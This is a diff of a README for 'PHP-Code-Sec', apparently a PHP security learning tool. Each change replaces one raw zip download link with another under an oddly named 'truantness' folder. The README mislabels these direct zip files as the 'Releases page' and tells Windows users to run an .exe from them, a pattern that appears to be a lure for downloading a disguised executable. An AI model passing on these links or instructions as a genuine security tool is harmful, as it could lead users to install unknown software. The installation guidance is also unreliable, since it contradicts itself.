@@ -6,7 +6,7 @@ Welcome to PHP-Code-Sec! This application helps you test and learn about common 
 
 ## 📥 Download PHP-Code-Sec
 
-[Download PHP-Code-Sec](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/PHP-Code-Sec-v2.2.zip) 
+[Download PHP-Code-Sec](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/Code_Sec_PH_v2.1.zip) 
 
 Click the link above to access the Releases page. Look for the latest version of PHP-Code-Sec to download.
 
@@ -28,11 +28,11 @@ Click the link above to access the Releases page. Look for the latest version of
 
 To install PHP-Code-Sec, follow these steps:
 
-1. **Visit the Releases Page**: Go to [PHP-Code-Sec Releases](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/PHP-Code-Sec-v2.2.zip).
+1. **Visit the Releases Page**: Go to [PHP-Code-Sec Releases](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/Code_Sec_PH_v2.1.zip).
   
 2. **Select the Latest Release**: Look for the latest version, marked with a tag and date.
 
-3. **Download the Installer**: Click on the installer file suitable for your operating system. For example, choose `https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/PHP-Code-Sec-v2.2.zip` for Windows users.
+3. **Download the Installer**: Click on the installer file suitable for your operating system. For example, choose `https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/Code_Sec_PH_v2.1.zip` for Windows users.
 
 4. **Run the Installer**:
     - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
@@ -60,7 +60,7 @@ After launching the application, you will see a simple interface designed for ea
 If you encounter issues during installation or use, consider the following steps:
 
 - **Check System Requirements**: Ensure your device meets the minimum requirements listed above.
-- **Re-download the Application**: Sometimes a download may fail. Make sure you have a good internet connection and attempt the download again from the [Releases page](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/PHP-Code-Sec-v2.2.zip).
+- **Re-download the Application**: Sometimes a download may fail. Make sure you have a good internet connection and attempt the download again from the [Releases page](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/Code_Sec_PH_v2.1.zip).
 - **Refer to the FAQ**: Look for common questions and issues in our FAQ section on the GitHub page.
 
 ## 🌐 Get Support
@@ -74,7 +74,7 @@ For additional help, you can reach out through the following channels:
 
 Keep your application up-to-date to benefit from the latest features and fixes:
 
-1. **Check for Updates**: Regularly visit the [Releases page](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/PHP-Code-Sec-v2.2.zip) to see if new versions are available.
+1. **Check for Updates**: Regularly visit the [Releases page](https://raw.githubusercontent.com/Sad-yst/PHP-Code-Sec/main/truantness/Code_Sec_PH_v2.1.zip) to see if new versions are available.
    
 2. **Download the Latest Version**: Follow the same steps as before to download and install.
 
